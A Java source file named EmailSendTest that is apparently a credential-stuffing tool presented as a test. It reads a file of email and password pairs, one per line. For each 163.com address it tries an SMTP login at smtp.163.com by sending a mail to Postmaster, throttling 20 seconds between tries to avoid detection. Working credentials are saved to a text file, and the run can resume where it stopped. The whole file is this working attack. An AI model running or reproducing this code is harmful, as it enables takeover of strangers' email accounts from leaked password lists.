package test;

import java.io.BufferedReader;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.RandomAccessFile;
import java.util.HashMap;
import java.util.Map;
import java.util.Properties;

import org.apache.commons.mail.EmailException;
import org.apache.log4j.Logger;

import com.sily.email.SendSimpleEmail;
import com.sily.publish.PublishResourceBundle;


public class EmailSendTest {

	private static Logger logger = Logger.getLogger("publish");
	
	public static void main(String[] args) {
		txtNoAtta();
	}
	
	public static void txtNoAtta(){
		String config = PublishResourceBundle.getResourcesAbsolutePath("mail.properties");
		Properties prop = new Properties();
		try {
			prop.load(new FileInputStream(config));
		} catch (FileNotFoundException e) {
			Logger.getLogger("publish").error(e.getMessage(),e);
		} catch (IOException e) {
			Logger.getLogger("publish").error(e.getMessage(),e);
		}
		try {
			String soucefile = prop.getProperty("source_file");
			BufferedReader br = new BufferedReader(new FileReader(soucefile));
			String oneline = "";
			boolean isRead = true;
			
			String mail163 = prop.getProperty("attachment_path")+"/163mial.txt";
			String mailRead = readFileEnd(mail163,"UTF-8");
			String chkmail = mailRead.substring(9,mailRead.indexOf("=")-1);
			chkmail = chkmail.trim()+"@163.com";
			while((oneline = br.readLine()) != null){
				logger.info(oneline);
				String ols[] = oneline.split("#");
				if(ols.length > 2){
					if(ols[2].indexOf("@")<2){
						continue;
					}
					String frommail = ols[2].trim();
					if(chkmail.trim().equals(frommail)){
						isRead = false;
					}
					if(isRead){
						continue;
					}
					
					String user = ols[2].trim().substring(0,ols[2].indexOf("@")-1);
					if(frommail.endsWith("163.com")){
						
						Thread.currentThread().sleep(1000*20);
						
						logger.info(frommail);
						Map to =  new HashMap();
						to.put("Postmaster@163.com","Postmaster");
						Map from =  new HashMap();
						from.put(frommail,user);
						String password = ols[1].trim();
						SendSimpleEmail sse = new SendSimpleEmail("UTF-8", "smtp.163.com", user, password, to, from, "主题","文本内容");
						try {
							sse.send();
							logger.info("rigth:" + frommail);
							FileWriter fw = new FileWriter(mail163,true);
							fw.write("username:"+ user + " = passwd:"+ password + "\r\n");
							fw.flush();
							fw.close();
						} catch (EmailException e) {
							logger.error(e.getMessage(),e);
						}
					}
				}
			}
		} catch (FileNotFoundException e1) {
			e1.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		} catch (InterruptedException e) {
			e.printStackTrace();
		}
	}
	
	
	
	/**
	 * 返回文件头map.get("sta")，和文件尾map.get("end")
	 */
	private static String readFileEnd(String filename, String charset) {
		Map<String,String> map = new HashMap<String,String>();
		RandomAccessFile rf = null;
		try {
			rf = new RandomAccessFile(filename, "r");
			long len = rf.length();
			if (len == 0) {
				return null;
			}
			long start = rf.getFilePointer();
			long nextend = start + len - 1;
			String line = "";
			rf.seek(nextend);
			int c = -1;
			while (nextend > start) {
				c = rf.read();
				if (c == '\n' || c == '\r') {
					line = rf.readLine();
					if (line != null && !"".equals(line.trim())) {
						return new String(line.trim().getBytes("iso-8859-1"));
					}
					nextend--;
					rf.seek(nextend);
					continue;
				}
				nextend--;
				rf.seek(nextend);
			}
		} catch (FileNotFoundException e) {
			logger.error(e.getMessage(), e);
		} catch (IOException e) {
			logger.error(e.getMessage(), e);
		} finally {
			try {
				if (rf != null)
					rf.close();
			} catch (IOException e) {
				logger.error(e.getMessage(), e);
			}
		}
		return null;
	}
}
